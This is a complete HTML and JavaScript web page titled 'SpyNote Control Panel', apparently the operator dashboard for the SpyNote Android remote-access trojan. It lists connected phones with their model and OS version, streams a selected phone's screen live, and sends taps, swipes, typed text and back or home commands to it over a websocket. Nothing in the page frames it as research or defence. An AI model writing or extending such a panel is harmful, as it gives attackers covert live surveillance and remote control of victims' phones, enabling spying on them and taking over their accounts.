<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; 
            background: rgba(0,0,0,0.85); padding: 20px; 
            max-height: 75vh; overflow-y: auto; width: 300px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
        }
        .device { padding: 15px; margin: 10px 0; background: #1e1e2e; cursor: pointer; 
            border-radius: 12px; transition: all 0.3s; border-left: 4px solid #666; }
        .device:hover { background: #2a2a3a; transform: translateX(8px); border-left-color: #00ff88; }
        .active { background: linear-gradient(135deg, #00ff88, #00cc6a) !important; 
                  color: #000; border-left-color: #00aa60 !important; }
        .disconnected { opacity: 0.6; border-left-color: #ff4444; }
        .device b { display: block; font-size: 14px; }
        .device small { opacity: 0.8; }

        #phone-frame {
            width: 420px; height: 900px; margin: 25px auto; 
            background: linear-gradient(145deg, #1a1a1a, #111); 
            border: 30px solid #2a2a2a; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
        }
        #screen { 
            width: 100%; height: 100%; background: #000; border-radius: 30px;
            image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.8);
        }
        #fps-counter { position: fixed; top: 15px; right: 160px; font-size: 13px; 
                       color: #00ff88; font-weight: bold; background: rgba(0,0,0,0.7); 
                       padding: 5px 10px; border-radius: 15px; }
        #status { position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
                  padding: 15px; border-radius: 10px; font-size: 13px; border: 1px solid #444; }
        
        #control-panel {
            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%);
            background: rgba(0,20,40,0.95); padding: 20px; border-radius: 25px;
            backdrop-filter: blur(25px); text-align: center; border: 1px solid #007bff;
        }
        button {
            padding: 12px 25px; margin: 6px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 25px; cursor: pointer; 
            font-size: 15px; font-weight: bold; transition: all 0.3s; min-width: 70px;
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,123,255,0.5); }
        button:active { transform: translateY(0); }
        #type-btn { background: linear-gradient(45deg, #28a745, #20c997); }
        #back-btn { background: linear-gradient(45deg, #dc3545, #c82333); }
        #home-btn { background: linear-gradient(45deg, #ffc107, #e0a800); }
        
        #type-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); display: none; z-index: 1000;
            justify-content: center; align-items: center;
        }
        #type-input-overlay {
            width: 90%; max-width: 500px; padding: 30px; background: linear-gradient(145deg, #1e1e2e, #2a2a3a); 
            border-radius: 20px; text-align: center; border: 2px solid #007bff;
            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
        }
        #type-input-overlay input {
            width: 100%; padding: 18px; margin: 15px 0; border: none; 
            border-radius: 15px; background: linear-gradient(145deg, #333, #444); 
            color: white; font-size: 20px; text-align: center;
        }
        #type-input-overlay button {
            width: 120px; margin: 8px;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 15px; color: #00ff88;">üì± LIVE Devices</h3>
        <div id="device-list">üîÑ Connecting...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">üîÑ Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
        <div id="resolution">-</div>
    </div>
    <div id="fps-counter">FPS: 0</div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="control-panel">
        <button id="type-btn" onclick="toggleTypeOverlay()">‚å®Ô∏è Type</button>
        <button id="back-btn" onclick="sendBack()">üîô Back</button>
        <button id="home-btn" onclick="sendHome()">üè† Home</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
    </div>

    <div id="type-overlay">
        <div id="type-input-overlay">
            <div style="font-size: 18px; margin-bottom: 20px; color: #00ff88;">
                ‚å®Ô∏è Type text & press Enter
            </div>
            <input type="text" id="type-input" placeholder="Type message here..." maxlength="300" autofocus>
            <br>
            <button onclick="sendTypedText()">‚úÖ Send</button>
            <button onclick="toggleTypeOverlay()">‚ùå Cancel</button>
        </div>
    </div>

    <script>
        const socket = io({ 
            transports: ['websocket'],
            upgrade: false,
            rememberUpgrade: false
        });
        
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920; // ‚úÖ Dynamic update
        let lastFrameTime = 0, frameCount = 0;
        let startX = 0, startY = 0, dragging = false;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d', { alpha: false, willReadFrequently: true });
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsDisplay = document.getElementById('fps');
        const fpsCounter = document.getElementById('fps-counter');
        const resolutionDisplay = document.getElementById('resolution');
        const typeOverlay = document.getElementById('type-overlay');
        const typeInput = document.getElementById('type-input');

        // ‚úÖ Perfect canvas setup
        canvas.width = 420; 
        canvas.height = 900;
        ctx.imageSmoothingEnabled = false;
        ctx.imageSmoothingQuality = 'high';

        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ LIVE';
            connectionStatus.style.color = '#00ff88';
            console.log('‚úÖ WebSocket Connected!');
        });

        // ‚úÖ FIXED: Perfect screen update handler
        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            // ‚úÖ Update device dimensions dynamically
            deviceWidth = data.width;
            deviceHeight = data.height;
            resolutionDisplay.textContent = `${data.width}x${data.height}`;
            
            const img = new Image();
            img.onload = () => {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    fpsCounter.textContent = `FPS: ${fps}`;
                    fpsDisplay.textContent = fps;
                    frameCount = 0;
                    lastFrameTime = now;
                }
            };
            img.onerror = () => console.log('Image load failed');
            img.src = 'data:image/jpeg;base64,' + data.data;
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this, ${info.width || 1080}, ${info.height || 1920})">
                        <b>${info.model?.slice(0,20) || id.slice(0,8)}</b>
                        <small>${info.brand || 'Android'} ${info.version || '?'}</small>
                        <div style="font-size: 11px; margin-top: 5px;">
                            ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}
                            ${info.width ? `<span style="opacity:0.7;">${info.width}x${info.height}</span>` : ''}
                        </div>
                    </div>
                `).join('') : '<div style="text-align:center;opacity:0.5;">No devices online</div>';
        }

        function selectDevice(deviceId, el, width=1080, height=1920) {
            currentDevice = deviceId;
            deviceWidth = width;
            deviceHeight = height;
            selectedDevice.textContent = deviceId.slice(0,8);
            resolutionDisplay.textContent = `${width}x${height}`;
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            console.log(`üì± Selected: ${deviceId} (${width}x${height})`);
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // ‚úÖ Ultra-responsive touch/mouse
        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
            }, { passive: false });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendSwipe(startX, startY, coords.x, coords.y);
            }, { passive: false });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (dragging && currentDevice) {
                    const coords = getScaledCoords(
                        e.changedTouches?.[0]?.clientX || e.clientX,
                        e.changedTouches?.[0]?.clientY || e.clientY
                    );
                    sendTap(coords.x, coords.y);
                }
                dragging = false;
            }, { passive: false });
        });

        function sendControl(action, x=0, y=0, startX=0, startY=0, endX=0, endY=0, text='') {
            if (!currentDevice) return alert('Select device first!');
            socket.emit('control', { 
                deviceId: currentDevice, action, x, y, startX, startY, endX, endY, text 
            });
        }

        function sendTap(x, y) { sendControl('tap', x, y); }
        function sendSwipe(sx, sy, ex, ey) { sendControl('swipe', 0, 0, sx, sy, ex, ey); }
        function sendText(text) { sendControl('type', 0, 0, 0, 0, 0, 0, text); }
        function sendBack() { sendControl('back'); }
        function sendHome() { sendControl('home'); }
        
        function toggleTypeOverlay() {
            typeOverlay.style.display = typeOverlay.style.display === 'flex' ? 'none' : 'flex';
            if (typeOverlay.style.display === 'flex') {
                typeInput.focus();
                typeInput.select();
            }
        }

        function sendTypedText() {
            const text = typeInput.value.trim();
            if (text && currentDevice) {
                sendText(text);
                typeInput.value = '';
            }
            toggleTypeOverlay();
        }

        typeInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                sendTypedText();
            }
        });

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // ‚úÖ Keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                sendBack();
                toggleTypeOverlay();
            }
            if (e.ctrlKey && e.key === 't') {
                e.preventDefault();
                toggleTypeOverlay();
            }
        });

        // ‚úÖ Initial devices fetch
        fetch('/devices').then(r => r.json()).then(updateDeviceList);
    </script>
</body>
</html>
